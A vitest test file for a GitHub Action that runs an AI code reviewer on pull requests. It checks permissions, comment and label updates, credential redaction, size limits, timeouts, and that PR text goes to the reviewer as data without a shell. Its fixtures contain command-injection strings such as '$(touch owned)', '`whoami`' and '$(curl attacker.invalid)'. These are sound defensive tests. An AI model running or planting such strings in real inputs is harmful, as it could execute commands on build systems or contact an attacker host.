import { EventEmitter } from "node:events";
import { readFileSync } from "node:fs";
import { PassThrough } from "node:stream";
import { spawn, type SpawnOptions } from "node:child_process";
import { describe, expect, it, vi } from "vitest";
import { describeOperationalError, runGithubReview, runReviewerCli } from "./github-review.js";

const validReview = {
  implementationCorrectness: 8,
  idiomaticity: 7,
  complexity: 9,
  testRiskCoverage: 6,
  documentation: 5,
  securitySafety: 8,
  verdict: "pass" as const,
  summary: "The change is sound.",
};

const env = {
  PR_NUMBER: "42",
  GITHUB_REPOSITORY: "octo-org/example",
  GITHUB_TOKEN: "github-test-secret",
  OPENROUTER_API_KEY: "openrouter-test-secret",
  OPENROUTER_MODEL: "provider/test-model",
};

interface RequestRecord {
  method: string;
  path: string;
  body?: string;
  accept: string | null;
}

interface HarnessOptions {
  comments?: Array<{ id: number; body: string | null; user?: { login?: string } }>;
  issueLabels?: string[];
  existingRepositoryLabels?: string[];
  failOn?: { method: string; path: string; status: number };
  latestHeadSha?: string;
}

function jsonResponse(status: number, value: unknown): Response {
  return new Response(JSON.stringify(value), {
    status,
    headers: { "Content-Type": "application/json" },
  });
}

function createHarness(options: HarnessOptions = {}) {
  const records: RequestRecord[] = [];
  const events: string[] = [];
  const existingRepositoryLabels = new Set(options.existingRepositoryLabels ?? []);
  let pullRequestRequests = 0;
  const fetchMock = vi.fn(async (input: RequestInfo | URL, init: RequestInit = {}) => {
    const url = new URL(String(input));
    const method = init.method ?? "GET";
    const path = decodeURIComponent(url.pathname) + url.search;
    const headers = new Headers(init.headers);
    const body = typeof init.body === "string" ? init.body : undefined;
    records.push({ method, path, body, accept: headers.get("Accept") });
    events.push(`${method} ${path}`);

    if (options.failOn?.method === method && options.failOn.path === path) {
      return jsonResponse(options.failOn.status, { message: "secret response content" });
    }
    if (path === "/repos/octo-org/example/pulls/42" && headers.get("Accept") === "application/vnd.github.diff") {
      return new Response("diff --git a/file.js b/file.js\n+$(touch owned) `not-a-command`", { status: 200 });
    }
    if (path === "/repos/octo-org/example/pulls/42") {
      pullRequestRequests += 1;
      return jsonResponse(200, {
        title: "Review $(touch owned) `not-a-command`",
        body: "Body with ; process substitution $(echo unsafe)",
        head: {
          sha: pullRequestRequests === 1
            ? "a".repeat(40)
            : options.latestHeadSha ?? "a".repeat(40),
        },
      });
    }
    if (path.startsWith("/repos/octo-org/example/issues/42/comments?")) {
      return jsonResponse(200, options.comments ?? []);
    }
    if (path === "/repos/octo-org/example/issues/42/comments" && method === "POST") {
      return jsonResponse(201, { id: 101, body: JSON.parse(body ?? "{}").body });
    }
    if (path === "/repos/octo-org/example/issues/42/labels" && method === "GET") {
      return jsonResponse(200, (options.issueLabels ?? []).map((name) => ({ name })));
    }
    if (path === "/repos/octo-org/example/labels/ai-cr:passed" && method === "GET") {
      return existingRepositoryLabels.has("ai-cr:passed")
        ? jsonResponse(200, { name: "ai-cr:passed", color: "existing-color" })
        : jsonResponse(404, { message: "Not Found" });
    }
    if (path === "/repos/octo-org/example/labels/ai-cr:failed" && method === "GET") {
      return existingRepositoryLabels.has("ai-cr:failed")
        ? jsonResponse(200, { name: "ai-cr:failed", color: "existing-color" })
        : jsonResponse(404, { message: "Not Found" });
    }
    if (path === "/repos/octo-org/example/labels/ai-cr:review" && method === "GET") {
      return existingRepositoryLabels.has("ai-cr:review")
        ? jsonResponse(200, { name: "ai-cr:review", color: "existing-color" })
        : jsonResponse(404, { message: "Not Found" });
    }
    if (path === "/repos/octo-org/example/labels" && method === "POST") {
      const label = JSON.parse(body ?? "{}") as { name: string; color: string };
      existingRepositoryLabels.add(label.name);
      return jsonResponse(201, label);
    }
    if (path === "/repos/octo-org/example/issues/42/labels" && method === "POST") {
      return jsonResponse(200, JSON.parse(body ?? "[]").map((name: string) => ({ name })));
    }
    if (path.startsWith("/repos/octo-org/example/issues/42/labels/") && method === "DELETE") {
      return jsonResponse(200, []);
    }
    if (path === "/repos/octo-org/example/issues/comments/55" && method === "PATCH") {
      return jsonResponse(200, { id: 55, body: JSON.parse(body ?? "{}").body });
    }
    if (method === "DELETE") {
      return new Response(null, { status: 204 });
    }
    throw new Error(`Unexpected mocked GitHub request: ${method} ${path}`);
  });

  return { events, records, fetchMock, existingRepositoryLabels };
}

describe("GitHub review action runner", () => {
  it("keeps the PR workflow trusted, gated, and serialized", () => {
    const workflowYaml = readFileSync(
      new URL("../../.github/workflows/review.yml", import.meta.url),
      "utf8",
    ).replaceAll("\r\n", "\n");
    expect(workflowYaml).toMatch(
      /on:\n\x20{2}pull_request:\n\x20{4}branches: \[main\]\n\x20{4}types: \[opened, synchronize, reopened, labeled\]/,
    );
    expect(workflowYaml).toMatch(
      /concurrency:\s+group:\s+ai-cr-\$\{\{\s*github\.event\.pull_request\.number\s*\}\}\s+cancel-in-progress:\s+true/,
    );
    expect(workflowYaml).not.toMatch(/pull_request_target|workflow_dispatch/);
    expect(workflowYaml).toContain("vars.AI_REVIEW_ENABLED == 'true'");
    expect(workflowYaml).toContain("github.event.label.name == 'ai-cr:review'");
    expect(workflowYaml).toContain("ref: ${{ github.event.pull_request.base.sha }}");
    expect(workflowYaml).toContain("persist-credentials: false");
    expect(workflowYaml).toContain("node-version-file: .nvmrc");
    expect(workflowYaml).toMatch(/uses: actions\/checkout@[a-f0-9]{40}/);
    expect(workflowYaml).toMatch(/uses: actions\/setup-node@[a-f0-9]{40}/);
    expect(workflowYaml).toContain("uses: ./");
    expect(workflowYaml).toContain("steps.review.outputs.verdict == 'fail'");

    const permissions = workflowYaml.match(/^permissions:\n((?:\x20{2}[^\n]+\n)+)/m)?.[1];
    expect(permissions).toBe("  contents: read\n  pull-requests: write\n  issues: write\n");
  });

  it("passes title, body, and diff as data and creates a marked comment and missing labels", async () => {
    const harness = createHarness({
      issueLabels: ["ai-cr:failed"],
      existingRepositoryLabels: ["ai-cr:passed"],
    });
    let receivedInput: unknown;
    let verdictOutput: string | undefined;

    const result = await runGithubReview({
      env,
      fetch: harness.fetchMock,
      runReviewer: async (input) => {
        harness.events.push("review");
        receivedInput = input;
        return validReview;
      },
      writeOutput: (verdict) => {
        verdictOutput = verdict;
        harness.events.push(`output:${verdict}`);
      },
    });

    expect(receivedInput).toEqual({
      title: "Review $(touch owned) `not-a-command`",
      body: "Body with ; process substitution $(echo unsafe)",
      diff: "diff --git a/file.js b/file.js\n+$(touch owned) `not-a-command`",
    });
    expect(result.verdict).toBe("pass");
    expect(verdictOutput).toBe("pass");

    const commentRequest = harness.records.find(
      (record) => record.method === "POST" && record.path === "/repos/octo-org/example/issues/42/comments",
    );
    expect(JSON.parse(commentRequest?.body ?? "{}").body).toContain("<!-- ai-cr-review -->");
    expect(JSON.parse(commentRequest?.body ?? "{}").body).toContain("| Security and safety | 8 / 10 |");
    expect(JSON.parse(commentRequest?.body ?? "{}").body).toContain("The change is sound.");
    expect(harness.records).toContainEqual(
      expect.objectContaining({
        method: "DELETE",
        path: "/repos/octo-org/example/issues/42/labels/ai-cr:failed",
      }),
    );

    const labelCreations = harness.records
      .filter((record) => record.method === "POST" && record.path === "/repos/octo-org/example/labels")
      .map((record) => JSON.parse(record.body ?? "{}"));
    expect(labelCreations).toEqual([{ name: "ai-cr:review", color: "fbca04" }]);
    expect(harness.events.at(-1)).toBe("output:pass");
    expect(harness.records.find((record) => record.path.endsWith("/pulls/42") && record.accept?.includes("diff"))?.accept)
      .toBe("application/vnd.github.diff");
  });

  it("updates one marked comment, removes the opposite label, consumes retry, then exposes fail", async () => {
    const harness = createHarness({
      comments: [{ id: 55, body: "Old summary\n<!-- ai-cr-review -->", user: { login: "github-actions[bot]" } }],
      issueLabels: ["ai-cr:passed", "ai-cr:review"],
      existingRepositoryLabels: ["ai-cr:review"],
    });
    const failingReview = { ...validReview, verdict: "fail" as const };
    const output: string[] = [];

    const result = await runGithubReview({
      env,
      fetch: harness.fetchMock,
      runReviewer: async () => {
        harness.events.push("review");
        return failingReview;
      },
      writeOutput: (verdict) => {
        output.push(verdict);
        harness.events.push(`output:${verdict}`);
      },
    });

    const commentUpdate = harness.records.find(
      (record) => record.method === "PATCH" && record.path === "/repos/octo-org/example/issues/comments/55",
    );
    expect(harness.records.filter((record) => record.path.includes("/comments?"))).toHaveLength(1);
    const updatedBody = JSON.parse(commentUpdate?.body ?? "{}").body as string;
    expect(updatedBody).toContain("## AI code review: fail");
    expect(updatedBody).toContain("| Implementation correctness | 8 / 10 |");
    expect(updatedBody).toContain("| Idiomaticity | 7 / 10 |");
    expect(updatedBody).toContain("| Complexity | 9 / 10 |");
    expect(updatedBody).toContain("| Test / risk coverage | 6 / 10 |");
    expect(updatedBody).toContain("| Documentation | 5 / 10 |");
    expect(updatedBody).toContain("| Security and safety | 8 / 10 |");

    const oppositeRemoval = harness.events.indexOf(
      "DELETE /repos/octo-org/example/issues/42/labels/ai-cr:passed",
    );
    const resultApplication = harness.events.indexOf("POST /repos/octo-org/example/issues/42/labels");
    const retryConsumption = harness.events.indexOf(
      "DELETE /repos/octo-org/example/issues/42/labels/ai-cr:review",
    );
    const outputEvent = harness.events.indexOf("output:fail");
    expect(oppositeRemoval).toBeGreaterThan(harness.events.indexOf("PATCH /repos/octo-org/example/issues/comments/55"));
    expect(resultApplication).toBeGreaterThan(oppositeRemoval);
    expect(retryConsumption).toBeGreaterThan(resultApplication);
    expect(outputEvent).toBeGreaterThan(retryConsumption);

    const createdLabels = harness.records
      .filter((record) => record.method === "POST" && record.path === "/repos/octo-org/example/labels")
      .map((record) => JSON.parse(record.body ?? "{}"));
    expect(createdLabels).toEqual([{ name: "ai-cr:failed", color: "d73a4a" }]);
    expect(result.verdict).toBe("fail");
    expect(output).toEqual(["fail"]);
  });

  it("does not overwrite a user-authored comment containing the review marker", async () => {
    const harness = createHarness({
      comments: [{ id: 56, body: "User note\n<!-- ai-cr-review -->", user: { login: "contributor" } }],
      existingRepositoryLabels: ["ai-cr:passed"],
    });

    await runGithubReview({
      env,
      fetch: harness.fetchMock,
      runReviewer: async () => validReview,
      writeOutput: () => undefined,
    });

    expect(harness.records.some((record) => record.method === "PATCH")).toBe(false);
    expect(harness.records).toContainEqual(
      expect.objectContaining({
        method: "POST",
        path: "/repos/octo-org/example/issues/42/comments",
      }),
    );
  });

  it("does not publish a verdict when an API operation fails", async () => {
    const harness = createHarness({
      issueLabels: [],
      existingRepositoryLabels: ["ai-cr:failed", "ai-cr:review"],
      failOn: {
        method: "POST",
        path: "/repos/octo-org/example/issues/42/labels",
        status: 500,
      },
    });
    const output: string[] = [];

    await expect(
      runGithubReview({
        env,
        fetch: harness.fetchMock,
        runReviewer: async () => ({ ...validReview, verdict: "fail" }),
        writeOutput: (verdict) => {
          output.push(verdict);
        },
      }),
    ).rejects.toThrow("GitHub API request failed (500).");
    expect(output).toEqual([]);
  });

  it("fails visibly after the bounded comment search without creating a duplicate", async () => {
    const harness = createHarness({
      comments: Array.from({ length: 100 }, (_, id) => ({
        id,
        body: "Unrelated comment",
        user: { login: "contributor" },
      })),
    });
    const output: string[] = [];

    await expect(
      runGithubReview({
        env,
        fetch: harness.fetchMock,
        runReviewer: async () => validReview,
        writeOutput: (verdict) => {
          output.push(verdict);
        },
      }),
    ).rejects.toThrow("Review comment search limit exceeded.");

    expect(harness.records.filter((record) => record.path.includes("/comments?"))).toHaveLength(10);
    expect(harness.records.some((record) => record.method === "POST" || record.method === "PATCH")).toBe(false);
    expect(output).toEqual([]);
  });

  it("does not publish a review when the PR head changes during the model call", async () => {
    const harness = createHarness({
      latestHeadSha: "b".repeat(40),
    });
    const output: string[] = [];

    await expect(
      runGithubReview({
        env,
        fetch: harness.fetchMock,
        runReviewer: async () => validReview,
        writeOutput: (verdict) => {
          output.push(verdict);
        },
      }),
    ).rejects.toThrow("Pull request changed during review.");

    expect(harness.records.some((record) => record.method === "POST" || record.method === "PATCH")).toBe(false);
    expect(output).toEqual([]);
  });

  it("redacts credentials from operational error messages", () => {
    expect(
      describeOperationalError(
        new Error(`Request failed with ${env.GITHUB_TOKEN} and ${env.OPENROUTER_API_KEY}`),
        env,
      ),
    ).not.toContain(env.GITHUB_TOKEN);
    expect(
      describeOperationalError(
        new Error(`Request failed with ${env.GITHUB_TOKEN} and ${env.OPENROUTER_API_KEY}`),
        env,
      ),
    ).not.toContain(env.OPENROUTER_API_KEY);
  });

  it("rejects oversized reviewer input before starting the child process", async () => {
    const spawnMock = vi.fn() as unknown as typeof spawn;
    await expect(
      runReviewerCli(
        { title: "title", body: "", diff: "x".repeat(1024 * 1024) },
        { apiKey: env.OPENROUTER_API_KEY, model: env.OPENROUTER_MODEL },
        {},
        spawnMock,
      ),
    ).rejects.toThrow("Reviewer input exceeds the 1 MiB limit.");
    expect(spawnMock).not.toHaveBeenCalled();
  });

  it("terminates the reviewer when stdout exceeds its limit", async () => {
    const child = new MockChildProcess();
    child.stdin.on("finish", () => {
      child.stdout.write("x".repeat(1024 * 1024 + 1));
    });
    const spawnMock = vi.fn(() => child as unknown as ReturnType<typeof spawn>) as unknown as typeof spawn;

    await expect(
      runReviewerCli(
        { title: "title", body: "", diff: "" },
        { apiKey: env.OPENROUTER_API_KEY, model: env.OPENROUTER_MODEL },
        {},
        spawnMock,
      ),
    ).rejects.toThrow("Reviewer stdout exceeds the 1 MiB limit.");
    expect(child.killed).toBe(true);
  });

  it("terminates the reviewer when stderr exceeds its limit", async () => {
    const child = new MockChildProcess();
    child.stdin.on("finish", () => {
      child.stderr.write("x".repeat(16 * 1024 + 1));
    });
    const spawnMock = vi.fn(() => child as unknown as ReturnType<typeof spawn>) as unknown as typeof spawn;

    await expect(
      runReviewerCli(
        { title: "title", body: "", diff: "" },
        { apiKey: env.OPENROUTER_API_KEY, model: env.OPENROUTER_MODEL },
        {},
        spawnMock,
      ),
    ).rejects.toThrow("Reviewer stderr exceeds the 16 KiB limit.");
    expect(child.killed).toBe(true);
  });

  it("terminates the reviewer when it exceeds the execution timeout", async () => {
    vi.useFakeTimers();
    const child = new MockChildProcess();
    const spawnMock = vi.fn(() => child as unknown as ReturnType<typeof spawn>) as unknown as typeof spawn;
    try {
      const reviewPromise = runReviewerCli(
        { title: "title", body: "", diff: "" },
        { apiKey: env.OPENROUTER_API_KEY, model: env.OPENROUTER_MODEL },
        {},
        spawnMock,
      );
      const timeoutAssertion = expect(reviewPromise).rejects.toThrow(
        "Reviewer process timed out after 10 minutes.",
      );
      await vi.advanceTimersByTimeAsync(10 * 60 * 1000);
      await timeoutAssertion;
      expect(child.killed).toBe(true);
    } finally {
      vi.useRealTimers();
    }
  });

  it("keeps action commands static and passes hostile PR text to the reviewer over stdin", async () => {
    const actionYaml = readFileSync(new URL("../../action.yml", import.meta.url), "utf8");
    const runCommands = actionYaml.match(/^[ \t]+run: (.+)$/gm) ?? [];
    expect(runCommands).toEqual([
      '      run: npm ci --include=dev --prefix "$GITHUB_ACTION_PATH/reviewer"',
      '      run: npm exec --prefix "$GITHUB_ACTION_PATH/reviewer" -- tsx "$GITHUB_ACTION_PATH/reviewer/src/github-review.ts"',
    ]);
    expect(actionYaml).not.toMatch(/run:.*(?:pull_request\.title|pull_request\.body|pull_request\.diff)/);

    const hostileInput = {
      title: "$(touch owned); `echo unsafe`",
      body: "x' ; exit 1 #",
      diff: "\n$(curl attacker.invalid) `whoami`",
    };
    const child = new MockChildProcess();
    let received: string | undefined;
    let spawnOptions: SpawnOptions | undefined;
    const spawnMock = vi.fn((command: string, args: string[], options: SpawnOptions) => {
      received = `${command}\n${JSON.stringify(args)}\n${String(options.shell)}`;
      spawnOptions = options;
      child.stdin.on("finish", () => {
        child.stdout.end(`${JSON.stringify(validReview)}\n`);
        child.stderr.end();
        child.stdout.once("end", () => child.emit("close", 0, null));
      });
      return child as unknown as ReturnType<typeof spawn>;
    }) as unknown as typeof spawn;

    const review = await runReviewerCli(
      hostileInput,
      { apiKey: env.OPENROUTER_API_KEY, model: env.OPENROUTER_MODEL },
      { GITHUB_TOKEN: env.GITHUB_TOKEN, GITHUB_OUTPUT: "output-file" },
      spawnMock,
    );

    expect(child.stdinData).toBe(JSON.stringify(hostileInput));
    expect(received).toContain('"--import","tsx","src/index.ts"');
    expect(received).toContain("false");
    expect(spawnMock).toHaveBeenCalledWith(
      process.execPath,
      ["--import", "tsx", "src/index.ts"],
      expect.objectContaining({ shell: false }),
    );
    const childEnv = spawnOptions?.env as NodeJS.ProcessEnv;
    expect(childEnv.GITHUB_TOKEN).toBeUndefined();
    expect(childEnv.GITHUB_OUTPUT).toBeUndefined();
    expect(review).toEqual(validReview);
  });
});

class MockChildProcess extends EventEmitter {
  stdin = new PassThrough();
  stdout = new PassThrough();
  stderr = new PassThrough();
  stdinData = "";
  killed = false;

  constructor() {
    super();
    this.stdin.setEncoding("utf8");
    this.stdin.on("data", (chunk: string) => {
      this.stdinData += chunk;
    });
  }

  kill(): boolean {
    this.killed = true;
    queueMicrotask(() => this.emit("close", null, "SIGTERM"));
    return true;
  }
}
